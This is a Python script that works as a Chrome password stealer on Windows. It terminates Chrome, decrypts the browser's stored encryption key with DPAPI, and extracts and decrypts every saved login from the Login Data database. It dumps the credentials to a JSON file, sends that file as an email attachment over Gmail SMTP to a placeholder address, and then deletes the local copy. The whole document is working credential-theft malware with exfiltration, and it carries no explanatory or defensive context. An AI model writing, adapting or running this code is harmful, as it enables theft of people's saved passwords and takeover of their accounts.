import os
import json
import base64
import sqlite3
import psutil
import win32crypt
from Crypto.Cipher import AES
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication

chrome_running = False
for process in psutil.process_iter():
    if process.name() == "chrome.exe":
        chrome_running = True
        break

if chrome_running:
    for process in psutil.process_iter():
        if process.name() == "chrome.exe":
            process.terminate()
            
def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    
    key = key[5:]
    
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    result = ""
    try:
        iv = password[3:15]
        password = password[15:]
        
        cipher = AES.new(key, AES.MODE_GCM, iv)
        
        result = cipher.decrypt(password)[:-16].decode()
    except:
        try:
            result = str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            pass
    
    return result

def send_email(sender, receiver, subject, text, file):
    message = MIMEMultipart()
    message['From'] = sender
    message['To'] = receiver
    message['Subject'] = subject

    text_part = MIMEText(text, 'plain')
    message.attach(text_part)

    with open(file, 'rb') as f:
        attachment_part = MIMEApplication(f.read(), Name=os.path.basename(file))
    
    attachment_part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(file))
    
    message.attach(attachment_part)

    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    
    server.login(sender, 'Gmail app password')
    
    server.sendmail(sender, receiver, message.as_string())
    server.quit()

db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")

conn = sqlite3.connect(db_path)
cursor = conn.cursor()
cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
login_data = cursor.fetchall()

key = get_encryption_key()

chrome_passwords = []
for url, user_name, pwd in login_data:
    pwd = decrypt_password(pwd, key)
    if pwd:
        chrome_passwords.append({
            "url": url,
            "username": user_name,
            "password": pwd
        })

chrome_file_name = 'chrome_passwords.json'
chrome_file_path = os.path.join(os.environ["USERPROFILE"], "Documents", chrome_file_name)
with open(chrome_file_path, 'w', encoding='utf-8') as f:
    json.dump(chrome_passwords, f, indent=4)

sender = 'example@gmail.com'
receiver = 'example@gmail.com'
subject = 'Chrome Password'
text = 'dudu.'
file = chrome_file_path

send_email(sender, receiver, subject, text, file)

chrome_file_path = os.path.join(os.environ["USERPROFILE"], "Documents", "chrome_passwords.json")

if os.path.exists(chrome_file_path):
    os.remove(chrome_file_path)